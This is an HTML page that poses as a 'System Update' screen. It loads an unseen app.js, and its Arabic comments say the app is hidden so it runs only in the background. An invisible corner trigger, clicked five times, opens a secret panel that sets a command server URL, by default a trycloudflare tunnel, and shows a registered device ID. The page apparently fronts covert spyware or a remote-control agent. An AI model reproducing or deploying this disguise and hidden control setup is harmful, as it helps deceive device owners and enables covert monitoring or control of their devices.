<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <meta name="theme-color" content="#000000">
    <style>
        /* إخفاء كامل للتطبيق ليعمل في الخلفية فقط */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { 
            width: 100%; 
            height: 100%; 
            background: #000; 
            overflow: hidden;
            display: flex !important;
            justify-content: center;
            align-items: center;
            color: #333;
            font-family: sans-serif;
            visibility: visible !important;
            opacity: 1 !important;
        }
        #app { 
            display: block; 
            visibility: visible;
            opacity: 1;
        }
        /* نقطة سرية جداً للدخول للإعدادات في حال الحاجة */
        .secret-trigger {
            position: fixed;
            bottom: 0;
            right: 0;
            width: 5px;
            height: 5px;
            background: transparent;
            z-index: 9999;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="app" style="text-align:center;">
        <div style="font-size:24px; margin-bottom:10px;">⚙️</div>
        <div>System Update in progress...</div>
    </div>
    <div class="secret-trigger" onclick="openSecretSettings()"></div>

    <!-- شاشة الإعدادات السرية -->
    <div id="secretSettings" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; color:#0f0; padding:20px; font-family:monospace; direction:ltr; text-align:left;">
        <h2 style="color:#0f0; border-bottom:1px solid #0f0; padding-bottom:10px;">🛠️ SYSTEM CONFIG</h2>
        <div style="margin:20px 0;">
            <label>SERVER_URL:</label><br>
            <input type="text" id="secretServerUrl" style="width:100%; background:#111; border:1px solid #0f0; color:#0f0; padding:10px; margin-top:5px;">
        </div>
        <div style="display:flex; gap:10px;">
            <button onclick="saveSecretSettings()" style="background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">SAVE & RESTART</button>
            <button onclick="closeSecretSettings()" style="background:#333; color:#fff; border:none; padding:10px 20px; cursor:pointer;">CLOSE</button>
        </div>
        <div style="margin-top:20px; font-size:12px; color:#666;">
            DEVICE_ID: <span id="secretDeviceId">-</span><br>
            STATUS: <span id="secretStatus">RUNNING</span>
        </div>
    </div>

    <script src="app.js"></script>
    <script>
        function openSecretSettings() {
            document.getElementById('secretServerUrl').value = localStorage.getItem('SERVER_URL') || 'https://assign-place-picture-recommendation.trycloudflare.com';
            document.getElementById('secretDeviceId').textContent = localStorage.getItem('deviceId') || 'NOT_REGISTERED';
            document.getElementById('secretSettings').style.display = 'block';
        }
        function closeSecretSettings() {
            document.getElementById('secretSettings').style.display = 'none';
        }
        function saveSecretSettings() {
            const url = document.getElementById('secretServerUrl').value.trim();
            if (url) {
                localStorage.setItem('SERVER_URL', url);
                alert('Saved! Restarting...');
                location.reload();
            }
        }
        // النقر 5 مرات متتالية في الركن السفلي الأيمن يفتح الإعدادات
        let clickCount = 0;
        document.querySelector('.secret-trigger').addEventListener('click', () => {
            clickCount++;
            if (clickCount >= 5) {
                openSecretSettings();
                clickCount = 0;
            }
            setTimeout(() => { clickCount = 0; }, 2000);
        });
    </script>
</body>
</html>
